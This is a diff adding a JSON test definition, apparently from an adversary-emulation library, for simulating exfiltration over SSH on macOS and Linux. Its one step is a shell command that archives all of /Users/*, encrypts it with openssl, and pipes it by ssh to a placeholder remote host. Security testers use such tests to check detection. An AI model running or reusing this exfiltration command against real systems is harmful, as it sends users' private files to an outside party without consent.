@@ -1,0 +1,44 @@
+{
+  "id": "7c3cb337-35ae-4d06-bf03-3032ed2ec268",
+  "name": "Exfiltration Over Alternative Protocol - SSH",
+  "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n",
+  "platforms": [
+    "darwin",
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "58c0bd31-3c08-469e-9057-3198e5342a1c",
+      "type": "execute-command",
+      "data": {
+        "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat \u003e /Users.tar.gz.enc'\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1048",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "domain",
+      "type": "url",
+      "description": "target SSH domain",
+      "value": "target.example.com"
+    },
+    {
+      "name": "user_name",
+      "type": "string",
+      "description": "username for domain",
+      "value": "atomic"
+    },
+    {
+      "name": "password",
+      "type": "string",
+      "description": "password for user",
+      "value": "atomic"
+    }
+  ]
+}
